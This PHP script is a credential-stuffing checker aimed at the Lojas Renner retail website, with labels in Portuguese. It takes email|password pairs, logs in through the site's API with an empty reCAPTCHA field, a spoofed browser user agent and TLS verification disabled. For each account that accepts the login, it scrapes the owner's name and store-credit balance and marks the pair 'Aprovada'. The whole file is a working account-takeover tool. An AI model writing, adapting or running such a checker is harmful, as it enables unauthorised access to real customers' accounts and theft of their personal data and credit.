<?php
error_reporting(0);
session_start();

header('Content-Type: application/json');

if (!isset($_GET['lista'])) {
    echo json_encode(array('error' => 'O parâmetro lista é obrigatório.'));
    exit;
}

$lista = $_GET['lista'];

$separar = explode("|", $lista);
if (count($separar) != 2) {
    echo json_encode(array('error' => 'Formato do parâmetro lista inválido. Use email|senha.'));
    exit;
}

$email = $separar[0];
$senha = $separar[1];

if (file_exists("coki.txt")) {
    unlink("coki.txt");
}

function getStr($string, $start, $end, $index = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$index]);
    return $str[0];
}

sleep(5);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/atg/rest/SessionConfirmationActor/getSessionConfirmationNumberAsString?pushSite=rennerBrasilDesktop");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coki.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coki.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.lojasrenner.com.br',
    'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'content-type: application/json',
    'accept: */*',
    'referer: https://www.lojasrenner.com.br/lst'
));
$wr1 = curl_exec($ch);

$idSs = getStr($wr1, '"sessionConfirmationNumber":"', '"', 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/atg/userprofiling/ProfileActor/login?_dynSessConf=$idSs&pushSite=rennerBrasilDesktop");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coki.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coki.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.lojasrenner.com.br',
    'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'content-type: application/json',
    'accept: */*',
    'referer: https://www.lojasrenner.com.br/lst'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array('realmId' => 'renner', 'g-recaptcha-response' => '', 'login' => $email, 'password' => $senha)));
$wr = curl_exec($ch);

$retorno = getStr($wr, '{"localizedMessage":"', '"', 1);

$response = array();

if (strpos($wr, 'localizedMessage') !== false) {
    $response[] = array('email' => $email, 'senha' => $senha, 'status' => 'Reprovada', 'motivo' => $retorno);
} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/lrsa/api/profile/ProfileActor/getProfile?_dynSessConf=$idSs&pushSite=rennerBrasilDesktop&reset=true");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coki.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coki.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.lojasrenner.com.br',
        'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'content-type: application/json',
        'accept: */*',
        'referer: https://www.lojasrenner.com.br/lst'
    ));
    $wr2 = curl_exec($ch);

    $nome = getStr($wr2, '"firstName":"', '"', 1);
    $sobrenome = getStr($wr2, '"lastName":"', '"', 1);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/store/renner/mobile/br/cartridges/MyAccountStoreCredit/fragments/MyAccountStoreCreditCacheCheck.jsp");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coki.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coki.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.lojasrenner.com.br',
        'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'referer: https://www.lojasrenner.com.br/minha-conta/vales-troca'
    ));
    $wr3 = curl_exec($ch);

    $vale = getStr($wr3, '<h2 class="menu-content__subtitle show-mobile">', '</h2>', 1);

    if (strpos($wr2, 'lastName') !== false) {
        $response[] = array('email' => $email, 'senha' => $senha, 'status' => 'Aprovada', 'nome' => "$nome $sobrenome", 'vale' => $vale);
    } else {
        $response[] = array('email' => $email, 'senha' => $senha, 'status' => 'Reprovada', 'motivo' => 'Falha desconhecida');
    }
}

echo json_encode($response);
?>